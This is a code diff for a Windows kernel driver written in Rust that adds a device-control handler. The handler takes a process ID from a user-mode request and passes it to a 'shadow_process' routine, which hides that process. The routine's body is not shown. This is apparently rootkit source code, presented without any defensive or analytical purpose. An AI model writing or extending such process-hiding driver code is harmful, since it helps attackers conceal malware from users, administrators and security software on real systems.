@@ -7,6 +7,11 @@ extern crate wdk_panic;
 mod utils;
 use utils::ToUnicodeString;
 
+mod process;
+use process::shadow_process;
+
+
+
 mod constants;
 use constants::IOCTL_PROCESS_HIDE_REQUEST;
 
@@ -21,6 +26,12 @@ use wdk_sys::{
     DEVICE_OBJECT, DRIVER_OBJECT, IRP, IRP_MJ_CREATE,IRP_MJ_DEVICE_CONTROL, NTSTATUS, PCUNICODE_STRING, PDEVICE_OBJECT,
     PDRIVER_DISPATCH, PIRP, PUNICODE_STRING, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION
 };
+use wdk_sys::ntddk::IofCompleteRequest;
+use wdk_sys::IO_NO_INCREMENT;
+
+
+
+
 
 #[cfg(not(test))]
 #[global_allocator]
@@ -80,7 +91,24 @@ unsafe extern "C" fn major_function_create(_device: PDEVICE_OBJECT, pirp: PIRP) 
 unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp: PIRP) -> NTSTATUS {
     let stack = IoGetCurrentIrpStackLocation(pirp);
     let ioctl = (*stack).Parameters.DeviceIoControl.IoControlCode;
-    println!("IOCTL: {:#x}", ioctl);
+    if ioctl == IOCTL_PROCESS_HIDE_REQUEST {
+        let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
+        println!("Hiding process with pid: {}", target_pid);
+        println!("Hiding process!");
+        
+        
+        match shadow_process(target_pid) {
+            Ok(_) => println!("Process {:?} successfully shadowed", target_pid),
+            Err(e) => println!("Error calling shadow_process: {:?}",e),
+        }
+
+
+        let status = STATUS_SUCCESS;
+        let informations = 0;
+        complete_request(pirp, status, informations);
+    }
+
+
 
     println!("Major function device control called!");
     STATUS_SUCCESS
@@ -97,3 +125,12 @@ pub unsafe fn IoGetCurrentIrpStackLocation(irp: PIRP) -> PIO_STACK_LOCATION {
         .__bindgen_anon_1
         .CurrentStackLocation
 }
+
+
+pub unsafe  fn complete_request(irp: PIRP, status: NTSTATUS, information: usize) {
+    (*irp).IoStatus.__bindgen_anon_1.Status = status;
+    (*irp).IoStatus.Information = information as u64;
+    IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
+}
+
+
